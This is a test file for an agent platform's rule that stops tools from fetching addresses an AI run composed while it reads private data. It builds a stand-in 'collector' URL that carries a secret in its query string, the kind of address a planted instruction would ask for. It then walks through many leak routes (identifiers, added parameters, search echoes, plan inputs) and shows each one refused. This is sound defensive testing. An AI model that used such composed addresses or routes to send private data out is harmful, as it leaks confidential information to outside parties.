/**
 * Which addresses an agent's tools take where a run reads material that is
 * not public (src/services/given-addresses.ts), against a real database
 * with two private labels.
 *
 * The first half tries to get an address the run composed fetched or
 * recorded, by every route there is, and fails each time: through the tool
 * loop, and through each service a tool calls, reached directly as if a
 * tool had been added without the loop. Nothing here reaches the network:
 * name lookup answers a public address and `fetch` is a stub that records
 * what it was asked for, so "nothing was fetched" is a count.
 *
 * The second half shows what a run can still do, and that a run at
 * `public` works as it always did, in the same deployment.
 */
import { describe, it, expect, vi, beforeAll, beforeEach, afterAll } from "vitest";
import { randomUUID } from "node:crypto";

vi.mock("node:dns/promises", () => ({
  lookup: async () => [{ address: "93.184.216.34", family: 4 }],
}));

// No model is called: each turn of a loop is scripted here.
const provider = vi.hoisted(() => ({ completeWithTools: vi.fn(), search: vi.fn() }));
vi.mock("../../src/llm/providers/index.js", async (orig) => ({
  ...(await orig<typeof import("../../src/llm/providers/index.js")>()),
  getAdapter: () => ({ name: "anthropic", completeWithTools: provider.completeWithTools }),
}));
vi.mock("../../src/llm/providers/openrouter.js", async (orig) => ({
  ...(await orig<typeof import("../../src/llm/providers/openrouter.js")>()),
  openrouterWebSearch: provider.search,
}));

import { rawQuery } from "../../src/db/client.js";
import { asGiven } from "./helpers.js";
import { setNoContextSessionForTests, withSystemClearance } from "../../src/db/clearance.js";
import { ensureEnforcement } from "../../src/db/enforcement.js";
import { loadConfig } from "../../src/config.js";
import { toolUseLoop } from "../../src/llm/client.js";
import { FETCH_RULE_NOTE_HEADING } from "../../src/llm/fetch-rule-note.js";
import { MODELS } from "../../src/llm/models.js";
import { resetProviderClearanceForTests } from "../../src/llm/provider-clearance.js";
import { executeReadPage, getReadPageToolDefinition } from "../../src/llm/tools/read-page-tool.js";
import { createWebSearch } from "../../src/llm/tools/web-search-tool.js";
import { runAtLabel, withAgent } from "../../src/llm/usage-context.js";
import { readListing, resolveFeed } from "../../src/services/feed-service.js";
import {
  AddressNotGivenError,
  addressAsGiven,
  addressNotGivenMessage,
  inputAsGiven,
  notePersonsAddresses,
} from "../../src/services/given-addresses.js";
import { fetchArxivSource, fetchViewable } from "../../src/services/paper-files.js";
import { getOrCreateSource, submitSource } from "../../src/services/source-service.js";
import { checkDoi, readPage } from "../../src/services/source-watch-service.js";
import { fetchPublicUrl } from "../../src/services/url-guard.js";

const A = "fetch-rule-a";
const B = "fetch-rule-b";
const tag = randomUUID().slice(0, 8);
const HOST = `https://docs-${tag}.example`;
/** What a planted instruction asks for: a host of its choosing, with what the run knows in the address. */
const COMPOSED = `https://collector-${tag}.example/take?q=the-reserve-is-4-million`;

const system = <T>(fn: () => Promise<T>) => withSystemClearance("A test seeds and removes rows at every label.", fn);
/** A run of `agent` at `label`, as a worker would start it. */
const run = <T>(label: string, fn: () => Promise<T>, agent = "steward") =>
  runAtLabel(label, "a test's run", () => withAgent(agent, fn));

const deployment = loadConfig() as unknown as { providerLabels: Record<string, string[]> };
const loaded = deployment.providerLabels;

/** Every address `fetch` was asked for, in order. */
const fetched: string[] = [];
/** What the stub serves: a body, or a redirect. Anything else is a 404. */
const pages = new Map<string, { body?: string; type?: string; redirect?: string }>();

// The rule is a deployment's choice and starts off (PRIVATE_RUN_FETCHES). This
// file is a deployment that has turned it on; the last block turns it off.
const fetchesBefore = loadConfig().privateRunFetches;

beforeAll(async () => {
  Object.assign(loadConfig(), { privateRunFetches: "given" });
  setNoContextSessionForTests(null);
  await system(async () => {
    await rawQuery(
      `INSERT INTO labels (name, description) VALUES ($1, 'One private label.'), ($2, 'Another, which does not read the first.')
       ON CONFLICT (name) DO NOTHING`,
      [A, B]
    );
    await rawQuery(`INSERT INTO label_reads (label, reads) VALUES ($1, 'public'), ($2, 'public') ON CONFLICT DO NOTHING`, [A, B]);
  });
  await ensureEnforcement();
  vi.stubGlobal("fetch", async (input: unknown) => {
    const url = String(input instanceof URL ? input.href : input);
    fetched.push(url);
    const page = pages.get(url);
    if (!page) return new Response("not here", { status: 404 });
    if (page.redirect) return new Response(null, { status: 302, headers: { location: page.redirect } });
    return new Response(page.body ?? "", { status: 200, headers: { "content-type": page.type ?? "text/html" } });
  });
});

afterAll(async () => {
  Object.assign(loadConfig(), { privateRunFetches: fetchesBefore });
  vi.unstubAllGlobals();
  deployment.providerLabels = loaded;
  resetProviderClearanceForTests();
  await system(async () => {
    await rawQuery(`DELETE FROM given_addresses WHERE url LIKE $1`, [`%${tag}%`]);
    await rawQuery(`DELETE FROM sources WHERE url LIKE $1`, [`%${tag}%`]);
    await rawQuery(`DELETE FROM given_addresses WHERE sensitivity_label = ANY($1::text[])`, [[A, B]]);
    await rawQuery(`DELETE FROM label_reads WHERE label = ANY($1::text[])`, [[A, B]]);
    await rawQuery(`DELETE FROM labels WHERE name = ANY($1::text[])`, [[A, B]]);
  }).catch((err: unknown) => console.warn("[given-addresses] cleanup:", err instanceof Error ? err.message : err));
});

beforeEach(() => {
  fetched.length = 0;
  provider.completeWithTools.mockReset();
  provider.search.mockReset();
  resetProviderClearanceForTests();
  deployment.providerLabels = {
    anthropic: ["public", A, B],
    web_pages: ["public", A, B],
    web_search: ["public", A, B],
  };
});

/** An address as a search would have given it to a run at `label`. */
const give = (label: string, url: string) => asGiven(url, label);

const givenRows = async (like: string) =>
  system(() =>
    rawQuery<{ url: string; given_by: string; label: string }>(
      `SELECT url, given_by, sensitivity_label AS label FROM given_addresses WHERE url LIKE $1 ORDER BY url`,
      [like]
    )
  );

interface Turn {
  calls?: Array<{ name: string; input: Record<string, unknown> }>;
  /** Blocks a provider-run search left in the turn. */
  server?: unknown[];
}

/** Run a loop whose model makes the scripted calls, with read_page as its tool; returns each tool result and what the model was sent. */
async function scripted(turns: Turn[], opts: { webSearch?: boolean } = {}) {
  const sent: Array<{ messages: Array<{ role: string; content: unknown }>; tools: Array<{ name?: string }> }> = [];
  let turn = 0;
  provider.completeWithTools.mockImplementation(async (req: { model: string; messages: never[]; tools: never[] }) => {
    sent.push({ messages: JSON.parse(JSON.stringify(req.messages)), tools: req.tools });
    const next = turns[turn++];
    const calls = (next?.calls ?? []).map((call, i) => ({ id: `call_${turn}_${i}`, ...call }));
    return {
      content: "",
      model: req.model,
      usage: { inputTokens: 1, outputTokens: 1 },
      stopReason: calls.length > 0 ? "tool_use" : "end_turn",
      toolUses: calls,
      rawContent: [...(next?.server ?? []), ...calls.map((call) => ({ type: "tool_use", ...call }))],
    };
  });
  const search = createWebSearch("not-an-anthropic-model");
  const results: string[] = [];
  await toolUseLoop({
    model: MODELS.sonnet,
    maxIterations: turns.length + 1,
    initialMessages: [{ role: "user", content: "Assess the claim." }],
    tools: [getReadPageToolDefinition(), ...(opts.webSearch ? [search.tool as never] : [])],
    executeTool: async (name, input) => {
      const out = name === "web_search" ? await search.execute!(input) : ((await executeReadPage(name, input)) ?? "unknown tool");
      results.push(out);
      return out;
    },
  });
  // The loop's own results, refusals included, are what the model was sent back.
  const toolResults = sent
    .flatMap((s) => s.messages)
    .filter((m) => m.role === "user" && Array.isArray(m.content))
    .flatMap((m) => (m.content as Array<{ type: string; content?: unknown }>).filter((b) => b.type === "tool_result"))
    .map((b) => (typeof b.content === "string" ? b.content : JSON.stringify(b.content)));
  return { sent, results, toolResults: [...new Set(toolResults)] };
}

// ---------------------------------------------------------------------------

describe("an address the run composed, at a label that reads private material", () => {
  it("is not fetched by read_page through the loop, and the refusal says what to do instead", async () => {
    const { toolResults, results } = await run(A, () => scripted([{ calls: [{ name: "read_page", input: { url: COMPOSED } }] }, {}]));
    expect(fetched).toEqual([]);
    // The tool itself never ran.
    expect(results).toEqual([]);
    expect(toolResults).toEqual([addressNotGivenMessage(COMPOSED)]);
  });

  it("is not made given by having been refused, so asking again fails the same way", async () => {
    await run(A, () =>
      scripted([
        { calls: [{ name: "read_page", input: { url: COMPOSED } }] },
        { calls: [{ name: "read_page", input: { url: COMPOSED } }] },
        {},
      ])
    );
    expect(fetched).toEqual([]);
    expect(await givenRows(`%collector-${tag}%`)).toEqual([]);
  });

  it("is not fetched by any reading service reached without the loop", async () => {
    await run(A, async () => {
      expect(await readPage(COMPOSED)).toEqual({ ok: false, problem: addressNotGivenMessage(COMPOSED) });
      expect(await fetchViewable(COMPOSED)).toEqual({ ok: false, problem: addressNotGivenMessage(COMPOSED) });
      expect(await readListing(COMPOSED)).toEqual({ ok: false, problem: addressNotGivenMessage(COMPOSED) });
      expect(await resolveFeed(COMPOSED)).toEqual({ ok: false, problem: addressNotGivenMessage(COMPOSED) });
      await expect(fetchPublicUrl(COMPOSED)).rejects.toBeInstanceOf(AddressNotGivenError);
    });
    expect(fetched).toEqual([]);
  });

  it("is not recorded as a source, so no worker fetches it later", async () => {
    await run(A, async () => {
      await expect(getOrCreateSource({ url: COMPOSED })).rejects.toBeInstanceOf(AddressNotGivenError);
      await expect(submitSource({ url: COMPOSED })).rejects.toBeInstanceOf(AddressNotGivenError);
    });
    expect(await system(() => rawQuery(`SELECT 1 FROM sources WHERE url = $1`, [COMPOSED]))).toEqual([]);
    expect(await system(() => rawQuery(`SELECT 1 FROM jobs WHERE input->>'url' = $1`, [COMPOSED]))).toEqual([]);
  });

  it("is refused wherever a tool's input names an address, at any depth, and other values are left alone", async () => {
    await give(A, `${HOST}/plan-item`);
    await run(A, async () => {
      expect(await inputAsGiven({ plan: { items: [{ action: "ingest", url: COMPOSED }] } })).toEqual({
        refusal: addressNotGivenMessage(COMPOSED),
      });
      expect(await inputAsGiven({ evidence_urls: [`${HOST}/plan-item`, COMPOSED] })).toEqual({
        refusal: addressNotGivenMessage(COMPOSED),
      });
      // An address in running text is not a parameter that holds one, and an
      // address that is not on the web (a kept reading) is not a fetch.
      const untouched = { content: `See ${COMPOSED}.`, url: "reading:warehouse/42", source_urls: [`${HOST}/plan-item`] };
      expect(await inputAsGiven(untouched)).toEqual({ input: untouched });
    });
  });

  it("cannot ride on a given address: a changed path or an added parameter is another address", async () => {
    const given = `${HOST}/report?id=5`;
    await give(A, given);
    pages.set(given, { body: "<p>The report.</p>" });
    await run(A, async () => {
      for (const changed of [`${HOST}/report?id=5&q=the-reserve`, `${HOST}/report?id=6`, `${HOST}/report/the-reserve?id=5`, `${HOST}/report`]) {
        expect(await readPage(changed), changed).toEqual({ ok: false, problem: addressNotGivenMessage(changed) });
      }
      expect(fetched).toEqual([]);
      // Written another way (http, www, a trailing slash, a fragment, a
      // tracking parameter), it is the same page, and what is fetched is the
      // address as it was given: the tracking parameter does not go out.
      const variant = `http://www.docs-${tag}.example/report/?id=5&utm_source=the-reserve-is-4-million#top`;
      expect((await readPage(variant)).ok).toBe(true);
      expect(fetched).toEqual([given]);
    });
  });

  it("is not taken in a call the agent's code would treat as its last, whose input no executor sees: a plan that names a document", async () => {
    const given = `${HOST}/a-document-to-ingest?id=9`;
    await give(A, given);
    const taken: unknown[] = [];
    const submit = { name: "submit_plan", description: "Submit the plan.", input_schema: { type: "object" as const, properties: { items: { type: "array", items: { type: "object", properties: { url: { type: "string" } } } } } } };
    const turns = [
      { id: "c1", input: { items: [{ action: "ingest", url: COMPOSED }] } },
      { id: "c2", input: { items: [{ action: "ingest", url: `${given}&utm_campaign=the-reserve-is-4-million` }] } },
    ];
    let turn = 0;
    const sentBack: string[] = [];
    provider.completeWithTools.mockImplementation(async (req: { model: string; messages: Array<{ content: unknown }> }) => {
      sentBack.push(JSON.stringify(req.messages[req.messages.length - 1]!.content));
      const call = { name: "submit_plan", ...turns[turn++]! };
      return { content: "", model: req.model, usage: { inputTokens: 1, outputTokens: 1 }, stopReason: "tool_use", toolUses: [call], rawContent: [{ type: "tool_use", ...call }] };
    });
    const result = await run(A, () =>
      toolUseLoop({
        model: MODELS.sonnet,
        maxIterations: 4,
        initialMessages: [{ role: "user", content: "Plan." }],
        tools: [submit],
        executeTool: async () => "not a final call",
        onFinalTool: (_name, input) => {
          taken.push(input);
          return input;
        },
      })
    );
    // The first plan was answered with the refusal and the loop went on; the
    // second was taken, with its address as it was given.
    expect(sentBack[1]).toContain("is not an address this graph has been given");
    expect(taken).toEqual([{ items: [{ action: "ingest", url: given }] }]);
    expect(result.toolUses[0]!.input).toEqual({ items: [{ action: "ingest", url: given }] });
    expect(JSON.stringify(result.rawContent)).not.toContain("the-reserve");
  });

  it("is not carried by an identifier: a DOI, an arXiv id or an arXiv address that is not one is not sent", async () => {
    await run(A, async () => {
      const doi = `10.1038/${"the-reserve-is-four-million-and-the-buyer-is-acme-".repeat(3)}`;
      expect((await checkDoi(doi)).found).toBe(false);
      expect((await fetchArxivSource("the-reserve-is-four-million/0000000")).ok).toBe(false);
      const address = "https://arxiv.org/abs/2401.01234?q=the-reserve";
      expect(await fetchArxivSource(address)).toEqual({ ok: false, problem: addressNotGivenMessage(address) });
    });
    expect(fetched).toEqual([]);
  });

  it("is not given by a search that repeats the query back, or by a turn's own text", async () => {
    provider.search.mockResolvedValue([
      { url: `${HOST}/hit`, title: "A hit", excerpt: `You searched for ${COMPOSED}. Related: ${HOST}/related` },
    ]);
    const { toolResults } = await run(A, () =>
      scripted(
        [
          { calls: [{ name: "web_search", input: { query: `${COMPOSED} reserve` } }] },
          { calls: [{ name: "read_page", input: { url: COMPOSED } }] },
          {},
        ],
        { webSearch: true }
      )
    );
    expect(fetched).toEqual([]);
    expect(toolResults).toContain(addressNotGivenMessage(COMPOSED));
    // The hit and the address in its excerpt are given; the query's is not.
    expect((await givenRows(`%${tag}%`)).filter((r) => r.label === A && /hit|related|collector/.test(r.url))).toEqual([
      { url: `${HOST}/hit`, given_by: "search", label: A },
      { url: `${HOST}/related`, given_by: "search", label: A },
    ]);
  });
});

describe("what such a run can fetch", () => {
  it("an address a provider-run search returned, and the addresses in the page it then reads", async () => {
    const found = `${HOST}/found-by-search`;
    pages.set(found, { body: `<p>The method is at ${HOST}/methods and the data at ${HOST}/data.csv.</p>` });
    pages.set(`${HOST}/methods`, { body: "<p>Methods.</p>" });
    const { results } = await run(A, () =>
      scripted([
        {
          server: [
            { type: "server_tool_use", id: "s1", name: "web_search", input: { query: "the report" } },
            { type: "web_search_tool_result", tool_use_id: "s1", content: [{ type: "web_search_result", url: found, title: "Found" }] },
          ],
          calls: [{ name: "read_page", input: { url: found } }],
        },
        { calls: [{ name: "read_page", input: { url: `${HOST}/methods` } }] },
        {},
      ])
    );
    expect(fetched).toEqual([found, `${HOST}/methods`]);
    expect(results.map((r) => JSON.parse(r).ok)).toEqual([true, true]);
    expect((await givenRows(`${HOST}/%`)).filter((r) => /found|methods|data/.test(r.url))).toEqual([
      { url: `${HOST}/data.csv`, given_by: "page", label: A },
      { url: found, given_by: "search", label: A },
      { url: `${HOST}/methods`, given_by: "page", label: A },
    ]);
  });

  it("where a redirect leads, which is the answering server's choice, and that address afterwards", async () => {
    const short = `${HOST}/short`;
    const landed = `https://publisher-${tag}.example/article/77`;
    await give(A, short);
    pages.set(short, { redirect: landed });
    pages.set(landed, { body: "<p>The article.</p>" });
    await run(A, async () => {
      expect((await readPage(short)).ok).toBe(true);
      expect(fetched).toEqual([short, landed]);
      expect(await addressAsGiven(landed)).toBe(landed);
    });
  });

  it("the address of a recorded source it can read, and not of one recorded at a label it does not read", async () => {
    const atPublic = `${HOST}/source-at-public`;
    const atB = `${HOST}/source-at-b`;
    await system(async () => {
      await rawQuery(`INSERT INTO sources (url, title, sensitivity_label) VALUES ($1, 'Public', 'public'), ($2, 'At b', $3)`, [atPublic, atB, B]);
    });
    pages.set(atPublic, { body: "<p>Public source.</p>" });
    pages.set(atB, { body: "<p>Source at b.</p>" });
    await run(A, async () => {
      expect((await readPage(atPublic)).ok).toBe(true);
      expect(await readPage(atB)).toEqual({ ok: false, problem: addressNotGivenMessage(atB) });
    });
    expect(fetched).toEqual([atPublic]);
  });

  it("an address given at its own label or at one it reads, and not one given to a label it does not read", async () => {
    await give(B, `${HOST}/given-at-b`);
    await run(A, async () => expect(await addressAsGiven(`${HOST}/given-at-b`)).toBeNull());
    await run(B, async () => expect(await addressAsGiven(`${HOST}/given-at-b`)).toBe(`${HOST}/given-at-b`));
  });

  it("the address resolve_identifier returns, which the loop offers beside a tool that takes an address", async () => {
    pages.set("https://doi.org/10.5555/fetch-rule-test", { body: "<p>The paper.</p>" });
    const { sent, toolResults } = await run(A, () =>
      scripted([
        { calls: [{ name: "resolve_identifier", input: { kind: "doi", id: "10.5555/Fetch-Rule-Test" } }] },
        { calls: [{ name: "read_page", input: { url: "https://doi.org/10.5555/fetch-rule-test" } }] },
        { calls: [{ name: "resolve_identifier", input: { kind: "doi", id: "10.5555/the reserve is 4 million" } }] },
        {},
      ])
    );
    expect(sent[0]!.tools.map((t) => t.name)).toEqual(["read_page", "resolve_identifier"]);
    expect(JSON.parse(toolResults[0]!)).toEqual({
      ok: true,
      kind: "doi",
      id: "10.5555/fetch-rule-test",
      address: "https://doi.org/10.5555/fetch-rule-test",
    });
    expect(fetched).toEqual(["https://doi.org/10.5555/fetch-rule-test"]);
    expect(JSON.parse(toolResults[2]!)).toMatchObject({ ok: false });
    expect(JSON.parse(toolResults[2]!).problem).toContain("so that an identifier cannot carry other text out");
  });

  it("an address its user wrote to the Assistant, at the conversation's label", async () => {
    const theirs = `${HOST}/the-page-i-mean?ref=intranet&doc=9`;
    await runAtLabel(A, "a conversation", () => notePersonsAddresses(`Please look at ${theirs} and tell me what it says.`));
    await run(A, async () => expect(await addressAsGiven(theirs)).toBe(theirs), "assistant");
    expect((await givenRows(`${HOST}/the-page-i-mean%`))[0]).toMatchObject({ given_by: "person", label: A });
  });
});

describe("a connection's tool", () => {
  it("is passed its arguments as written: they go to the organization's own system, not to the open web", async () => {
    const inside = "https://wiki.intranet.example/pages/reserve-policy";
    const wiki = { name: "wiki__get_page", description: "Read a wiki page.", input_schema: { type: "object" as const, properties: { url: { type: "string" } } } };
    const got: unknown[] = [];
    let turn = 0;
    const tools: string[][] = [];
    provider.completeWithTools.mockImplementation(async (req: { model: string; tools: Array<{ name: string }> }) => {
      tools.push(req.tools.map((t) => t.name));
      const calls = turn++ === 0 ? [{ id: "w1", name: "wiki__get_page", input: { url: inside } }] : [];
      return { content: "", model: req.model, usage: { inputTokens: 1, outputTokens: 1 }, stopReason: calls.length ? "tool_use" : "end_turn", toolUses: calls, rawContent: calls.map((c) => ({ type: "tool_use", ...c })) };
    });
    await run(A, () =>
      toolUseLoop({
        model: MODELS.sonnet,
        initialMessages: [{ role: "user", content: "Read the policy." }],
        tools: [wiki],
        executeTool: async (_name, input) => {
          got.push(input);
          return "The policy.";
        },
      })
    );
    expect(got).toEqual([{ url: inside }]);
    // With no other tool that takes an address, the run is offered no identifier tool.
    expect(tools[0]).toEqual(["wiki__get_page"]);
    expect(fetched).toEqual([]);
  });
});

describe("what the run is told", () => {
  it("is the rule, once, in its first message, when it has a tool that takes an address", async () => {
    const { sent } = await run(A, () => scripted([{ calls: [{ name: "read_page", input: { url: COMPOSED } }] }, {}]));
    const first = (m: { messages: Array<{ content: unknown }> }) => JSON.stringify(m.messages[0]!.content);
    expect(first(sent[0]!)).toContain(JSON.stringify(FETCH_RULE_NOTE_HEADING).slice(1, -1));
    // The label note stands ahead of it, and the second turn carries each once.
    expect(first(sent[0]!).indexOf("This run's label")).toBeLessThan(first(sent[0]!).indexOf("Addresses this run's tools take"));
    expect(first(sent[1]!).split("Addresses this run's tools take").length).toBe(2);
    expect(first(sent[1]!)).toBe(first(sent[0]!));
  });

  it("is nothing where no tool of the run takes an address", async () => {
    const sent: string[] = [];
    provider.completeWithTools.mockImplementation(async (req: { model: string; messages: unknown; tools: Array<{ name: string }> }) => {
      sent.push(JSON.stringify(req.messages), req.tools.map((t) => t.name).join(","));
      return { content: "", model: req.model, usage: { inputTokens: 1, outputTokens: 1 }, stopReason: "end_turn", toolUses: [], rawContent: [] };
    });
    await run(A, () =>
      toolUseLoop({
        model: MODELS.sonnet,
        initialMessages: [{ role: "user", content: "Decide." }],
        tools: [{ name: "decide", description: "Decide.", input_schema: { type: "object" as const, properties: { verdict: { type: "string" } } } }],
        executeTool: async () => "ok",
      })
    );
    expect(sent[0]).toContain("This run's label");
    expect(sent[0]).not.toContain("Addresses this run's tools take");
    expect(sent[1]).toBe("decide");
  });
});

describe("a run at public, in the same deployment", () => {
  it("fetches the address it wrote, as written, is offered no new tool, is told nothing of the rule, and records nothing as given", async () => {
    const before = await system(() => rawQuery<{ n: number }>(`SELECT count(*)::int AS n FROM given_addresses`));
    const composed = `${HOST}/built-by-the-run?page=2&utm_source=x`;
    pages.set(composed, { body: `<p>Page two. Next: ${HOST}/built-by-the-run?page=3</p>` });
    const { sent, results } = await run("public", () =>
      scripted([
        {
          server: [{ type: "web_search_tool_result", tool_use_id: "s1", content: [{ type: "web_search_result", url: `${HOST}/a-hit`, title: "Hit" }] }],
          calls: [{ name: "read_page", input: { url: composed } }],
        },
        {},
      ])
    );
    expect(fetched).toEqual([composed]);
    expect(JSON.parse(results[0]!)).toMatchObject({ ok: true, url: composed });
    expect(sent[0]!.tools.map((t) => t.name)).toEqual(["read_page"]);
    expect(JSON.stringify(sent[0]!.messages)).not.toContain("Addresses this run's tools take");
    await run("public", async () => {
      // The services too: a source at an address the run wrote, and a DOI of any shape.
      const source = await getOrCreateSource({ url: `${HOST}/recorded-by-a-public-run?x=1` });
      expect(source.url).toBe(`${HOST}/recorded-by-a-public-run?x=1`);
      expect(source.sensitivityLabel).toBe("public");
    });
    expect(await system(() => rawQuery<{ n: number }>(`SELECT count(*)::int AS n FROM given_addresses`))).toEqual(before);
  });

  it("and a person's own request, outside any run, is not held to the rule at any label", async () => {
    const theirs = `${HOST}/submitted-by-a-person?token=abc`;
    const source = await runAtLabel(A, "a person's request", () => getOrCreateSource({ url: theirs }));
    expect(source).toMatchObject({ url: theirs, sensitivityLabel: A });
  });
});

describe("a deployment that has not turned the rule on, which is how every deployment starts", () => {
  beforeAll(() => {
    Object.assign(loadConfig(), { privateRunFetches: "any" });
  });
  afterAll(() => {
    Object.assign(loadConfig(), { privateRunFetches: "given" });
  });

  it("starts off: the setting's own default is any address", async () => {
    expect(fetchesBefore).toBe("any");
  });

  it("a run at a private label fetches the address it wrote, as written, with the tools and the brief it had before the rule, and nothing is recorded", async () => {
    const before = await system(() => rawQuery<{ n: number }>(`SELECT count(*)::int AS n FROM given_addresses`));
    const composed = `${HOST}/built-while-off?page=2&doi=10.1000/xyz`;
    pages.set(composed, { body: `<p>Page two. Next: ${HOST}/built-while-off?page=3</p>` });
    fetched.length = 0;
    const { sent, results, toolResults } = await run(A, () =>
      scripted([
        {
          server: [{ type: "web_search_tool_result", tool_use_id: "s1", content: [{ type: "web_search_result", url: `${HOST}/a-hit-while-off`, title: "Hit" }] }],
          calls: [{ name: "read_page", input: { url: composed } }],
        },
        {},
      ])
    );
    expect(fetched).toEqual([composed]);
    expect(JSON.parse(results[0]!)).toMatchObject({ ok: true, url: composed });
    expect(toolResults.join("\n")).not.toContain("is not an address this graph has been given");
    // No resolve_identifier beside it, and no note in the brief.
    expect(sent[0]!.tools.map((t) => t.name)).toEqual(["read_page"]);
    expect(JSON.stringify(sent[0]!.messages)).not.toContain("Addresses this run's tools take");
    await run(A, async () => {
      const source = await getOrCreateSource({ url: `${HOST}/recorded-while-off?x=1` });
      expect(source.url).toBe(`${HOST}/recorded-while-off?x=1`);
      expect(source.sensitivityLabel).toBe(A);
    });
    expect(await system(() => rawQuery<{ n: number }>(`SELECT count(*)::int AS n FROM given_addresses`))).toEqual(before);
  });
});
